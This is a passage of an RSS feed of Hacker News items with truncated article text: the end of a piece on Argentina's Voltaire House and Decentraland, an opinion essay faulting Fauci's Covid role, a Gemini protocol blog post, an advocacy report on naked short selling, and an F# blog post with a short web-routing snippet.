<p>To build out BitPay’s development team in Argentina, Aráoz leased the building that would become Voltaire. The house soon became a creative laboratory for him and his friends. It hosted the regular crew of about 15 coders, with others streaming in and out. House members would congregate around a big table framed by a giant statue of the letter “V” or gather in the little back garden for cookouts. During these years, members were constantly tinkering. A visitor recalled how they had outfitted a small room with VR sensors and once tried to install a system that would play customized music for each person who entered the house.</p>



<p>This early experimentation would lead to Voltaire House’s highest-profile creation: Decentraland, a VR metaverse powered by the Ethereum blockchain with its own crypto token.<strong> </strong>To put it in layman’s terms, Decentraland was a virtual world with a limited number of properties that people could buy through a proprietary currency and sell for real money. It was a petri dish for the ideals of democracy and decentralization they championed, built on the premise that a virtual world controlled by its own “citizens” could more effectively govern itself — and offer more stable investment opportunities — than a real one governed by elites. Decentraland’s founders stipulated that it would be overseen by a “Decentralized Autonomous Organization,” a group of Decentraland residents who would vote on management decisions.&nbsp;</p>



<p>These were the heady days of cryptocurrency, when the possibilities for expansion seemed infinite. Between February and December of 2017 alone, the value of a single Bitcoin jumped from under $1,000 to almost $20,000, and the members of Voltaire House did not want to miss out on the opportunity. In August of that year, Decentraland hosted what is known as an initial coin offering, in which they started publicly selling their token. They <a href="https://bravenewcoin.com/insights/decentraland-raises-24-million-in-35-seconds-leaving-retail-investors-out-in-the-cold">raised</a> $24 million in 35 seconds, before shutting down the ICO. It’s unclear whether the creators ever cashed out, but some users did: One later told <a href="https://www.marketwatch.com/story/people-are-making-more-than-500-buying-property-that-doesnt-actually-exist-2018-09-04">MarketWatch</a> that he spent $60,000 on plots in Decentraland’s first city, which was&nbsp;eventually worth $350,000.</p>



<p>Decentraland is one of about a half-dozen products to achieve international recognition whose origins can be traced to Voltaire, despite the house’s low profile.<strong> </strong>Another of Aráoz’s contributions to the world of crypto was a service called <a href="https://www.coindesk.com/how-block-chain-technology-is-working-to-transform-intellectual-property">Proof of Existence</a>, a decentralized online notary, which made a splash as the first nonfinancial application of blockchain. In 2014, leading crypto-news outlet <em>Coindesk</em> projected that Proof of Existence could “revolutionize intellectual property rights,” and Voltaire House member Esteban Ordano went on <a href="https://blog.po.et/introducing-po-et-digital-media-blockchain-technology-collide-e53728fc1c24">to adapt</a> the technology underlying it for his own company, <a href="https://www.po.et/?utm_source=icodrops">Po.et</a>, …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://restofworld.org/2021/rise-and-fall-of-the-house-of-bitcoin/">https://restofworld.org/2021/rise-and-fall-of-the-house-of-bitcoin/</a></em></p>]]>
            </description>
            <link>https://restofworld.org/2021/rise-and-fall-of-the-house-of-bitcoin/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25988070</guid>
            <pubDate>Mon, 01 Feb 2021 12:33:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Case Against Fauci]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 15 (<a href="https://news.ycombinator.com/item?id=25986443">thread link</a>) | @andrewon
<br/>
January 31, 2021 | https://www.thedriftmag.com/the-case-against-fauci/ | <a href="https://web.archive.org/web/*/https://www.thedriftmag.com/the-case-against-fauci/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p><strong>T</strong><span>here is no one in American government — or perhaps any government — quite like Dr. Anthony Fauci. His position, with its mixture of informal power and public visibility, scientific authority and beltway influence, is sui generis. Few other unconfirmed civil servants have access to as many rooms in the executive interagency; no public official commands as much respect in the world of science and medicine. As director of the National Institute of Allergy and Infectious Diseases (NIAID) since 1984, he has advised six presidents (and now a seventh) on domestic and global health issues — HIV/AIDS, SARS, Ebola, Zika, and MERS — and overseen decades of research on infectious disease, pandemics, and virology. Under his stewardship, NIAID’s mission has been reshaped around his personage: its priorities are </span><i><span>his</span></i><span> priorities, its research agenda is </span><i><span>his</span></i><span> research agenda. And that agenda has borne fruit: breakthrough treatments for HIV and other deadly diseases and now, a vaccine for Covid-19. As Stanford microbiologist David Relman told </span><i><span>The</span></i> <i><span>New Yorker</span></i><span> in April, “Tony has essentially become the embodiment of the biomedical and public-health research enterprise in the United States.”</span></p>
<p><span>Although Fauci has no statutory authority to preside over a public health crisis, he has become the nation’s de facto Doctor-in-Chief during this pandemic. His face — elven and expressive — is the face of the medical establishment’s response to the novel coronavirus. I doubt most Americans can name the (</span><a href="https://www.washingtonpost.com/us-policy/2021/01/20/biden-surgeon-general-resignation/" target="_blank" rel="noopener noreferrer"><span>outgoing</span></a><span>) U.S. Surgeon General, CDC Director, or Fauci’s nominal boss, the director of the National Institutes of Health (Jerome Adams, Robert Redfield, and Francis Collins, respectively), but everyone knows Dr. Fauci. His plaintive but never pessimistic patter and disarming outer-borough rasp are soothing sonic features of our daily dirge of death, doom, and statistics. I was relieved when I first saw Fauci on TV — sometime in March 2020 — thinking dimly to myself, for the millionth time, “Ah, an adult in the room.” Amid a ceaseless current of chaos and grief, Fauci’s egoless display of competence, his grandfatherly warmth and irony, were ports in a storm.&nbsp;</span></p>
<p><span>But a comforting bedside manner has done little to mitigate catastrophe. Over 400,000 Americans are dead, twice as many as any other country. Infections, hospitalizations, and deaths are currently at record highs. And although we have a vaccine, the rollout has already been stymied by a dearth of resources and coordination. As one public health expert told <em>The </em></span><i><span>New York Times </span></i><span>on January 17</span><i><span>,</span></i><span> our pandemic response has been “a colossal failure at every level of government.” And herein lies a paradox. America is suffering from a disease outbreak whose morbid scope is the consequence of world-historic negligence. We are desperately and needlessly sick. And yet, the man known as “America’s Doctor,” the undisputed personification of public health research and pandemic preparedness, faces no reputational consequences. On the contrary, Dr. Fauci remains one of our most beloved public figures.&nbsp;&nbsp;</span></p>
<p><span>What explains this? Liberals, who otherwise harshly condemn the federal government’s pandemic response, are especially besotted with the diminutive virologist. For fans of the #Resistance, a well-timed </span><a href="https://www.businessinsider.com/dr-anthony-fauci-did-a-facepalm-during-trumps-coronavirus-briefing-2020-3" target="_blank" rel="noopener noreferrer"><span>facepalm</span></a><span> during one of the Mad King’s early soliloquies guaranteed Fauci’s place on a Mount Rushmore of replacement patriarchs, alongside James Comey and Robert Mueller. (Fauci later insisted the gesture was innocuous; he was merely obscuring his face to dislodge a lozenge from his throat.) Still, Democrats’ devotion has never waned. They see in Fauci a lonely champion of “truth” and “facts” in a White House otherwise hostile to “science.” Brad Pitt earned an Emmy nomination for portraying the 80-year-old physician on Saturday Night Live. One Hamilton-inspired TikTok (“My name is Dr. Anthony Fau-CHEE…”) went viral. Just since the beginning of the “third wave” of Covid infections in October, Fauci has received leadership awards from the National Academy of Medicine, the FBI Agents Association, the Arthur Ashe Institute for Urban Health, and the Boy Scouts of America. Joe Biden has </span><a href="https://www.cnn.com/2020/12/03/politics/anthony-fauci-biden-transition/index.html" target="_blank" rel="noopener noreferrer"><span>asked</span></a><span> Fauci to stay on at NIAID and serve in his administration as a chief medical advisor. D.C. Mayor Muriel Bowser proclaimed “Anthony S. Fauci Day” on December 24.&nbsp;</span></p>
<p><span>Fauci’s celebrity, however, cannot obscure empirical reality. As America’s Doctor would surely agree, the numbers don’t lie: 2,824 Americans died of Covid-19 on Anthony S. Fauci Day.&nbsp;</span></p>
<p><span>Anthony Fauci is no doubt a dedicated public servant, respected by his colleagues, beloved by many Americans. But the puzzle remains: why has the man most closely associated with the public health response to the pandemic entirely avoided accountability for its failure?&nbsp;</span></p>

<p><strong>F</strong><span>irst, the most straightforward defense: it wasn’t his fault. He did the best he could, but Fauci’s better instincts were thwarted by Trump and his coterie of idiots. Of course, there’s truth in this. The uneasy peace between Trump and his medical advisors started to unravel almost before it began. By the end of March, Trump was sweating the stocks and tweeting that the “cure” must not be worse “than the problem itself.” He clashed with Fauci throughout the spring — over masks, hydroxychloroquine, school openings, and Easter. By summer, Trump was publicly lambasting the good doctor, leaking anti-Fauci talking points to the press and sidelining him in task force meetings, which were themselves increasingly rare. Scott Atlas, the libertarian radiologist and herd-immunity advocate whom Trump hired based on his Fox News appearances, was calling the shots.</span></p>
<p><span>But Fauci seldom contradicted the president’s lies outright, opting for tact and de-escalation instead. “I can’t jump in front of the microphone and push him down,” Fauci </span><a href="https://www.theguardian.com/world/2020/mar/23/dr-fauci-press-conference-white-house-coronavirus" target="_blank" rel="noopener noreferrer"><span>said</span></a><span> in late March. “OK, he said it. Let’s try and get it corrected for the next time.” On July 4, Trump said 99 percent of Covid cases were “harmless.” Fauci characterized this as a misinterpretation. (“I’m trying to figure out where the president got that number…” he said.) Though Fauci has a reputation for bluntness, as the </span><i><span>Financial Times</span></i><span>’s Hannah Kuchler </span><a href="https://www.ft.com/content/57834c2c-a078-4736-9173-8fb32cfbbf4e" target="_blank" rel="noopener noreferrer"><span>observed</span></a><span>, “he clearly also tries to hold back, believing he will make a bigger difference to the course of the pandemic if he keeps his job.”</span></p>
<p><span>This logic pervades the most common defense of Fauci’s record. “Tony is unique, in that he has such credibility with politicians that he’s been able to insert hard facts into the conversation,” Nobel laureate biologist David Baltimore told </span><i><span>The</span></i> <i><span>New Yorker</span></i><span> in April. “That has been wonderful for our country and the world.” In this view, Fauci was </span><i><span>handling</span></i><span> Trump, just as he handled previous presidents, including a reluctant Ronald Reagan during the AIDS epidemic. When he pulls his punches, it’s always for the greater good; namely, the cause of remaining in the room. Stepping too far out of line, contradicting Trump with too much vigor, would have imperiled his standing. “The argument for Fauci saying more,” </span><a href="https://www.washingtonpost.com/opinions/2020/07/16/anthony-fauci-built-truce-trump-is-destroying-it/?arc404=true" target="_blank" rel="noopener noreferrer"><span>wrote</span></a><span> Molly Roberts in <em>The</em> </span><i><span>Washington Post</span></i><span>, “… is also an argument for self-exile.” And then what? Truth and facts would have had no advocate inside the White House. As Fauci himself </span><a href="https://www.nytimes.com/2021/01/24/health/fauci-trump-covid.html?action=click&amp;module=Top%20Stories&amp;pgtype=Homepage" target="_blank" rel="noopener noreferrer"><span>told</span></a><span> the </span><i><span>Times</span></i><span> on Sunday, “I felt that if I stepped down, that would leave a void. Someone’s got to not be afraid to speak out the truth.”</span></p>
<p><span>At a briefing in July, Trump </span><a href="https://www.cnn.com/2020/07/28/politics/donald-trump-anthony-fauci-approval-rating/index.html" target="_blank" rel="noopener noreferrer"><span>mused</span></a><span>, “It’s interesting: [Fauci’s] got a very good approval rating. And I like that, it’s good. Because remember, he’s working for this administration. He’s working with us.” Winding his way to his point, Trump said, “So why don’t I have a high approval rating… with respect to the virus?” After a pause, he deadpanned, “It can only be my personality, that’s all.”&nbsp;</span></p>
<p><span>As is often the case with Trump, he had a point, just not the one he meant. The liberal apologia for Fauci </span><i><span>was</span></i><span> internally contradictory. As one scientist said to me, “We can’t deify Fauci’s response to the pandemic as fantastic while simultaneously condemning Trump, when for months, the two were hand in hand.” Indeed, Fauci is only blameless if he was utterly powerless to stop the administration’s disastrous plans. And if he </span><i><span>was</span></i><span> powerless, he should’ve resigned and communicated the truth bluntly to the public long ago. Otherwise, he knowingly lent credibility to an abject failure he couldn’t control.&nbsp;</span></p>
<p><span>To put an even finer point on it, the precise conditions that would maximally exonerate Fauci — i.e., Trump is solely at fault; Fauci had no influence — are conditions under which Fauci </span><i><span>absolutely </span></i><span>should have bolted. The more aberrant Trump’s behavior, the more he diverged from the medically prudent course of action, the greater Fauci’s responsibility to leave and blow the whistle. If Fauci knew better but didn’t say, what use was he inside the room? If he </span><i><span>didn’t</span></i><span> know better, then he shares the blame.&nbsp;</span></p>
<p><span>In recent days, Fauci and Covid task force coordinator Dr. Deborah Birx — another veteran AIDS researcher who’s received slightly </span><a href="https://www.politico.com/news/2020/11/18/biden-coronavirus-team-deborah-birx-437923" target="_blank" rel="noopener noreferrer"><span>less deferential</span></a><span> treatment from the media than her male counterpart — have undertaken a goodwill tour. Birx </span><a href="https://twitter.com/FaceTheNation/status/1353332977560735744?s=20" target="_blank" rel="noopener noreferrer"><span>told</span></a><span> CBS that denialists in the White House “derailed” the pandemic response, putting out information she knew to be false. Fauci joked with Rachel Maddow that Trump had </span><a href="https://www.msnbc.com/rachel-maddow/watch/fauci-to-maddow-i-ve-been-wanting-to-come-on-your-show-for-months-and-months-99905093921" target="_blank" rel="noopener noreferrer"><span>forbidden</span></a><span>&nbsp;him from coming on her show and </span><a href="https://www.usatoday.com/story/news/politics/2021/01/21/anthony-fauci-speaking-covid-liberating-under-biden-vs-trump/4244169001/" target="_blank" rel="noopener noreferrer"><span>told</span></a><span> the White House press corps, “The idea that you can get up here and… let the science speak, it is somewhat of a liberating feeling.” Meanwhile, liberal pundits like Ezra Klein have </span><a href="https://www.nytimes.com/2021/01/18/opinion/biden-covid-19-plan.html" target="_blank" rel="noopener noreferrer"><span>praised</span></a><span> Biden’s “maddeningly obvious” Covid plans, describing their simplicity as a “damning indictment” of Trump’s negligence. But if Biden’s life-saving interventions are so straightforward and crucial, why weren’t Fauci and Birx loudly demanding them months ago?&nbsp;</span></p>
<p><span>“To keep their jobs” should not be a satisfying answer — not for the living or for the dead.&nbsp;</span></p>

<p><strong>F</strong><span>rank assessments of Fauci’s performance are hard to come by. Those in a position to judge him from an informed public …</span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.thedriftmag.com/the-case-against-fauci/">https://www.thedriftmag.com/the-case-against-fauci/</a></em></p>]]>
            </description>
            <link>https://www.thedriftmag.com/the-case-against-fauci/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25986443</guid>
            <pubDate>Mon, 01 Feb 2021 07:30:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[gemini:// space]]>
            </title>
            <description>
<![CDATA[
Score 271 | Comments 166 (<a href="https://news.ycombinator.com/item?id=25986378">thread link</a>) | @pabs3
<br/>
January 31, 2021 | https://spwhitton.name//blog/entry/geminispace/ | <a href="https://web.archive.org/web/*/https://spwhitton.name//blog/entry/geminispace/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div class="page">







<div id="pagebody">

<div id="content">
<p>Recently I have become curious about <a href="https://gemini.circumlunar.space/">the Gemini
Project</a> and the content that people have
made available to be retrieved over the gemini:// protocol.  I’m not convinced
by the arguments for not just using http, and mostly it’s just that I
typically find more things that I am interested in casually reading through on
people’s gemlogs than I would on, say, reddit, and similar aggregators.  But
presumably advocates of gemini:// and the text/gemini format would argue that
it’s various respects in which it differs from the web that makes geminispace
conducive to the production of the sort of content you find there.  So I’m
remaining open minded about the possibility that having a completely separate
protocol is important, and not just an annoyance because rss2email doesn’t
work and I had to spend time writing
<a href="https://manpages.debian.org/gmi2email">gmi2email</a>.</p>

<p>I now have a games console at home for the first time in some years, which I
bought in response to the ongoing pandemic, and one thing that I have noticed
is that using it feels like being offline in a way that playing games on a
regular computer never would.  It has a WiFi connection but it doesn’t have a
web browser, and I am glad that using it provides an opportunity to be
disconnected from the usual streams of information.  And perhaps something
similar ought to be said in favour of how the Gemini project does not just use
http.  There is, perhaps, a positive psychological effect induced by making
the boundary between text/gemini and the web as hard as it is made by using
gemini:// rather than http.</p>

<p>Something about which I find myself much more sceptical is how the
specification for gemini:// and text/gemini is not extensible.  Advocates of
Gemini have this idea that they can’t include, say, a version number in the
protocol, because the extensibility of the web is what has led to the problems
they think it has, so they want to make it impossible.  Now on the one hand
perhaps the people behind Gemini are in the best position that anyone is in to
come up with a spec which they will finalise and render effectively
unchangeable, because a lot of them have been using Gopher for decades, and so
they have enough experience to be able to say exactly what Gopher is missing,
and be confident that they’ve not missed anything.  But on the other hand,
Gemini is one technological piece in attempts to make a version of the
Internet which is healthier for humans – the so-called “small Internet”
movement – and maybe there will be new ideas about how the small Internet
should be which would benefit from a new version of the Gemini specification.
So it seems risky to lock-in to one version.</p>

<p><a href="https://news.ycombinator.com/item?id=25986378">Comments on Hacker News</a>.</p>

</div>









</div>



</div></div>]]>
            </description>
            <link>https://spwhitton.name//blog/entry/geminispace/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25986378</guid>
            <pubDate>Mon, 01 Feb 2021 07:14:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Counterfeiting Stock – Explaining illegal naked shorting and stock manipulation]]>
            </title>
            <description>
<![CDATA[
Score 334 | Comments 386 (<a href="https://news.ycombinator.com/item?id=25986320">thread link</a>) | @lelf
<br/>
January 31, 2021 | http://counterfeitingstock.com/CS2.0/CounterfeitingStock.html | <a href="https://web.archive.org/web/*/http://counterfeitingstock.com/CS2.0/CounterfeitingStock.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">


<center><b>Counterfeiting Stock 2.0</b></center>

<p>
Illegal naked shorting and stock manipulation are two of Wall Street's deep, dark secrets. These practices have been around for decades and have resulted in trillions of dollars being fleeced from the American public by Wall Street. In the process, many emerging companies have been put out of business. This report will explain the magnitude of this problem, how it happens, why it has been covered up and how short sellers attack a company. It will also show how all of the participants; the short hedge funds, the prime brokers and the Depository Trust Clearing Corp. (DTCC)—make unconscionable profits while the fleecing of the small American investor continues unabated.
</p>
<p>
<span>Why is This Important?</span> This problem affects the investing public. Whether invested directly in the stock market or in mutual funds, IRAs, retirement or pension plans that hold stock — it touches the majority of Americans.
</p>
<p>
The participants in this fraud, which, when fully exposed, will make Enron look like child's play, have been very successful in maintaining a veil of secrecy and impenetrability. Congress and the SEC have unknowingly (?) helped keep the closet door closed. The public rarely knows when its pocket is being picked as unexplained drops in stock price get chalked up to “market forces” when they are often market manipulations.
</p>
<p>
The stocks most frequently targeted are those of emerging companies who went to the stock market to raise start–up capital. Small business brings the vast majority of innovative new ideas and products to market and creates the majority of new jobs in the United States. It is estimated that over 1000 of these emerging companies have been put into bankruptcy or had their stock driven to pennies by predatory short sellers. 
</p>
<p>
It is important to understand that selling a stock short is not an investment in American enterprise. A short seller makes money when the stock price goes down and that money comes solely from investors who have purchased the company's stock. A successful short manipulation takes money from investment in American enterprise and diverts it to feed Wall Street's insatiable greed—the company that was attacked is worse off and the investing public has lost money. Frequently this profit is diverted to off–shore tax havens and no taxes are paid. This national disgrace is a parasite on the greatest capital market in the world.
</p>
<p>
<span>A Glossary of Illogical Terms</span> — The securities industry has its own jargon, laws and practices that may require explaining. Most of these concepts are the creation of the industry, and, while they are promoted as practices that ensure an orderly market, they are also exploited as manipulative tools. This glossary is limited to naked short abuse, or counterfeiting stock as it is more correctly referred to. 
</p>

<ol>
<li><b>Broker Dealer or Prime Broker</b> — The big stockbrokers who clear their own transactions, which is to say they move transacted shares between their customers directly, or with the DTC. Small brokers will clear through a clearing house — also known as a broker's broker.
</li>
<li><b>Hedge Funds</b> — Hedge funds are really unregulated investment pools for rich investors. They have grown exponentially in the past decade and now number over 10,000 and manage over one trillion dollars. They don't register with the SEC, are virtually unregulated and frequently foreign domiciled, yet they are allowed to be market makers with access to all of the naked shorting loopholes. Frequently they operate secretively and collusively. The prime brokers cater to the hedge funds and allegedly receive eight to ten billion dollars annually in fees and charges relating to stock lend to the short hedge funds.
</li>
<li><b>Market Maker</b> — A broker, broker dealer or hedge fund who makes a market in a stock. In order to be a market maker, they must always have shares available to buy and sell. Market makers get certain sweeping exemptions from SEC rules involving naked shorting.
</li>
<li><b>Short Seller</b> — An individual, hedge fund, broker or institution who sells stock short. The group of short sellers is referred to as “the shorts.”
</li>
<li><b>The Securities and Exchange Commission</b> — The SEC is the federal enforcement agency that oversees the securities markets. The top–level management is a five–person Board of Governors who are Presidential appointees. Three of the governors are usually from the securities industry, including the chairman. The SEC adopted Regulation SHO in January 2005 in an attempt to curb naked short abuse.
</li>
<li><b>Depository Trust Clearing Corp</b> — Usually known as the DTCC, this privately held company is owned by the prime brokers and it clears, transacts and holds most stock in this country. It has four subsidiaries, which include the DTC and the NCSS. The operation of this company is described in detail later.
</li>
<li><b>Short Sale</b> — Selling a stock short is a way to make a profit while the stock price declines. For example: If investor S wishes to sell short, he borrows a share from the account of investor L. Investor S immediately sells that share on the open market, so investor S now has the cash from the sale in his account, and investor L has an IOU for the share from investor S. When the stock price drops, investor S takes some of the money from his account and buys a share, called “covering”, which he returns to investor L's account. Investor S books a profit and investor L has his share back.
<p>This relatively simple process is perfectly legal—so far. The investor lending the share most likely doesn't even know the share left his account, since it is all electronic and occurs at the prime broker or DTC level. If shares are in a margin account, they may be loaned to a short without the consent or knowledge of the account owner. If the shares are in a cash account, IRA account or are restricted shares they are not supposed to be borrowed unless there is express consent by the account owner.
</p></li>
<li><b>Disclosed Short</b> — When the share has been borrowed or a suitable share has been located that can be borrowed, it is a disclosed short. Shorts are either naked or disclosed, but, in reality, some disclosed shorts are really naked shorts as a result of fraudulent stock borrowing. 
</li>
<li><b>Naked Short</b> — This is an invention of the securities industry that is a license to create counterfeit shares. In the context of this document, a share created that has the effect of increasing the number of shares that are in the market place beyond the number issued by the company, is considered counterfeit. This is not a legal conclusion, since some shares we consider counterfeit are legal based upon today's rules. The alleged justification for naked shorting is to insure an orderly and smooth market, but all too often it is used to create a virtually unlimited supply of counterfeit shares, which leads to widespread stock manipulation—the lynchpin of this massive fraud. 
<p>
Returning to our example, everything is the same except the part about borrowing the share from someone else's account: There is no borrowed share — instead a new one is created by either the broker dealer or the DTC. Without a borrowed share behind the short sale, a naked short is really a counterfeit share.
</p></li>
<li><b>Fails–to–Deliver</b> — The process of creating shares via naked shorting creates an obvious imbalance in the market as the sell side is artificially increased with naked short shares or more accurately, counterfeit shares. Time limits are imposed that dictate how long the sold share can be naked. For a stock market investor or trader, that time limit is three days. According to SEC rules, if the broker dealer has not located a share to borrow, they are supposed to take cash in the short account and purchase a share in the open market. This is called a “buy–in,” and it is supposed to maintain the total number of shares in the market place equal to the number of shares the company has issued.
<p>
Market makers have special exemptions from the rules: they are allowed to carry a naked short for up to twenty–one trading days before they have to borrow a share. When the share is not borrowed in the allotted time and a buy–in does not occur, and they rarely do, the naked short becomes a fail–to–deliver (of the borrowed share).
</p></li>
<li><b>Options</b> — The stock market also has separate, but related markets that sell options to purchase shares (a “call”) and options to sell shares (a “put”). Options are an integral part of short manipulations, the result of SEC promulgated loopholes in Reg SHO. A call works as follows: Assume investor L has a share in his account that is worth $25. He may sell an option to purchase that share to a third party. That option will be at a specific price, say $30, and expires at a specific future date. Investor L will get some cash from selling this option. If at the expiration date, the market value of the stock is below $30 (the “strike price”), the option expires as worthless and investor L keeps the option payment. This is called “out of the money.” If the market value of the stock is above the strike price, then the buyer of the option “calls” the stock. Assume the stock has risen to $40. The option buyer tenders $30 to investor L and demands delivery of the share, which he may keep or immediately sell for a $10 profit.
</li>
<li><b>Naked call</b> — The same as above except that investor L, who sells the call, has no shares in his account. In other words, he is selling an option on something he does not own. The SEC allows this. SEC rules also allow the seller of a naked short to treat the purchase of a naked call as a borrowed share, thereby keeping their naked short off the SEC's fails–to–deliver list. A share of stock that has a naked call as its borrowed shares is marked as a disclosed short when it is sold, even though nobody in the transaction actually owns a share.
</li>
</ol>




<p>
<span>How The System Transacts Stocks</span> — This explanation has been greatly simplified in the interest of brevity. 
</p>

<img src="http://counterfeitingstock.com/CS2.0/diagram.png">

<ol>
<li><b>Customers</b> — These can be individuals, institutions, hedge funds and prime broker's house accounts.</li></ol></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://counterfeitingstock.com/CS2.0/CounterfeitingStock.html">http://counterfeitingstock.com/CS2.0/CounterfeitingStock.html</a></em></p>]]>
            </description>
            <link>http://counterfeitingstock.com/CS2.0/CounterfeitingStock.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25986320</guid>
            <pubDate>Mon, 01 Feb 2021 06:59:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[F# is gaining independence from .NET]]>
            </title>
            <description>
<![CDATA[
Score 208 | Comments 171 (<a href="https://news.ycombinator.com/item?id=25986316">thread link</a>) | @sidcool
<br/>
January 31, 2021 | https://onurgumus.github.io/2021/01/31/What-the-F.html | <a href="https://web.archive.org/web/*/https://onurgumus.github.io/2021/01/31/What-the-F.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content-wrapper">
      <div>
         <section id="main-content">
            

<p>In a previous <a href="https://onurgumus.github.io/2020/12/26/Functional-Programming.html">post</a> I have explained my motivations for functional programming.
It’s no secret I love F# because F# makes me sleep better. In this post, I would like to discuss some different aspects of F#.</p>

<h2 id="f-is-gaining-independence-from-net">F# is gaining independence from .NET</h2>

<p><img src="https://onurgumus.github.io/assets/posts/2021-01-31-What-the-F/platform.png" alt="F# platforms"></p>

<!--more-->

<p>F# is mostly known to the developer community as the small ignored brother of C# running on the .NET platform. However, what is less known about F# is that it
has come to a level to be .NET independent. Thanks to <a href="https://fable.io/">Fable</a>, today F# can be considered as a complete replacement of TypeScript. Yes,
people do write full-blown SPA, React, Svelte applications by using F# instead of TypeScript. If you think Fable is just a transpiler, think again:  https://github.com/kunjee17/awesome-fable . I would say Fable is on the way being an ecosystem by itself.</p>

<p>There is also a new prototype target for Fable that allows F# code to transpile to Python developed by Dag Brattli.</p>

<p><img src="https://onurgumus.github.io/assets/posts/2021-01-31-What-the-F/python2.gif" alt="Python"></p>

<p>F# also works as on WebAssembly with <a href="https://fsbolero.io/">Bolero</a> which is still based on .NET. And not to forget another F# web platform called <a href="https://websharper.com/">WebSharper</a> from the same people who developed Bolero.</p>

<p>Just like JavaScript people were using NodeJs to bring the front-end devs to the backend zone, F# also can be used to bring the backend-devs to the front-end realm. I am a living example myself. By using F# in the font-end you can practically share the code between your .NET/Node backend and the browser, giving you an isomorphic development experience.</p>

<p>This somewhat puts F# in an interesting position as historically most dotnet has been languages are managed by Microsoft. But Fable simply liberates
F# from Microsoft and .NET.</p>

<h2 id="the-f-fanboys">The F# fanboys</h2>

<p>You might have heard “one of those guys” like me who is talking about how great functional programming and/or F# is. And from that point, it looks like below</p>

<p><img src="https://onurgumus.github.io/assets/posts/2021-01-31-What-the-F/music.png" alt="music"></p>

<p>I know it’s annoying, however, let’s look at it from the side and this is how an F# developer feels when he or she is suggesting you using F#:
<img src="https://onurgumus.github.io/assets/posts/2021-01-31-What-the-F/wheel.png" alt="wheels"></p>

<h2 id="microsofts-and-communitys-stance">Microsoft’s and community’s stance</h2>

<p>From Microsoft’s point of view, F# is actively supported and maintained. There are Microsoft developers actively fixing things and adding new features however as a general Microsoft’s point of view .NET == C# and that is that. From .NET developer community’s
point of view, things are even worse. Since all Microsoft docs and tools geared towards C#, adding up unfamiliarity with the functional paradigm, most people follow C# way and completely ignore its little brother F#. I still think this is a missed 
opportunity for the .NET community. For example, let’s look at the excellent server side F# web framework <a href="https://giraffe.wiki/">Giraffe</a>. 
While C# and asp.net developers are busy memorizing the Microsoft way of handling requests, learning what attributes to decorate their
classes and members, the F# developers who use giraffe, simply rely on functional composition:</p>

<div><div><pre><code><span>let</span> <span>app</span> <span>=</span>
    <span>route</span> <span>"/"</span>
    <span>&gt;=&gt;</span> <span>setHttpHeader</span> <span>"X-Foo"</span> <span>"Bar"</span>
    <span>&gt;=&gt;</span> <span>setStatusCode</span> <span>200</span>
    <span>&gt;=&gt;</span> <span>setBodyFromString</span> <span>"Hello World"</span>
</code></pre></div></div>

<p>As HTTP processing is usually treated as a pipeline by itself on the server-side, it’s an excellent target for functional programming. Just like lego, plug-in your pipes, and you are good to go.</p>

<p>Furthermore, most developers worry about if they could find an F# job whereas companies who consider making the switch worry if they could find an F# developer.
As of today on linked in there are approximately 700 F# jobs and even most of these are not F# specific rather than they are like “C# or F# developers wanted”.</p>

<p>And most non-.NET people are not willing to touch anything related to Microsoft even with a 10 foot pole. (Of course, the major exceptions to this are TypeScript and Visual Studio Code which both are widely popular). The  Functional programmers’ camp also dismisses F# at sight blaming it’s not like Haskell as in for example F# does not support type classes.</p>

<h2 id="couple-of-unique-features-of-f">Couple of unique features of F#</h2>

<p>I am not going to talk about the features of F# but just wanted to highlight a couple of them.</p>

<p>The first one is the file order. Please look at the below photo:</p>

<p><img src="https://onurgumus.github.io/assets/posts/2021-01-31-What-the-F/files.png" alt="file-order"></p>

<p>In F# the order of the files matter. It is somewhat a disliked feature by the newcomers, but it makes the dependencies immediately visible.
So the code in the top file has no dependency on any others below and the 2nd file from the top only depends on the first. When you open a project which you are not 
familiar, file ordering helps to find your way.</p>

<p>The second one is Type Providers:</p>

<p><img src="https://onurgumus.github.io/assets/posts/2021-01-31-What-the-F/sqlprovider.gif" alt="type-providers"></p>

<p>Type providers are somewhat code generators but they do that non-intrusively. Very roughly similar to LISP style macros they expand at compile time. Type providers make it very easy to discover HTML or JSON documents read database rows, file system, and discover DDL and rows within the coding screen without leaving your editor. And everything becomes so type-safe.</p>

<h2 id="develop-fantastic-ui-apps-with-f-and-elmish">Develop fantastic UI apps with F# and Elmish</h2>

<p>Well they say seeing is believing, so let’s see how well F# handles UI development. While React devs on Facebook trying to solve the state problem over and over again by using hooks and perhaps new experimental
recoil and contexts IMHO, all are horrible options as they encourage rendering code inter-mix with business code reminding me asp.net web forms times where you could write your SQL statements right into the page itself.</p>

<p>F# developers have ported elm architecture to something called elmish and it flourished well among F# community.</p>

<p>Here’s a list of things you can do with Elmish as you can write your business code once and port it to any UI platform below:</p>

<ul>
  <li>React: <a href="https://github.com/elmish/react">Elmish React</a></li>
  <li>Windows Desktop: <a href="https://github.com/elmish/Elmish.WPF">Elmish WPF</a></li>
  <li>Gaming: <a href="https://github.com/ChrisPritchard/Xelmish">Xelmish</a></li>
  <li>Cross platform UI: <a href="https://github.com/AvaloniaCommunity/Avalonia.FuncUI">Avalonia.FuncUI</a></li>
  <li>Mobile development: <a href="https://github.com/fsprojects/Fabulous">Fabulous</a></li>
  <li>Terminal: <a href="https://github.com/DieselMeister/Terminal.Gui.Elmish">Terminal.Gui.Elmish</a></li>
  <li>Web Assembly: <a href="https://fsbolero.io/">Bolero</a></li>
</ul>

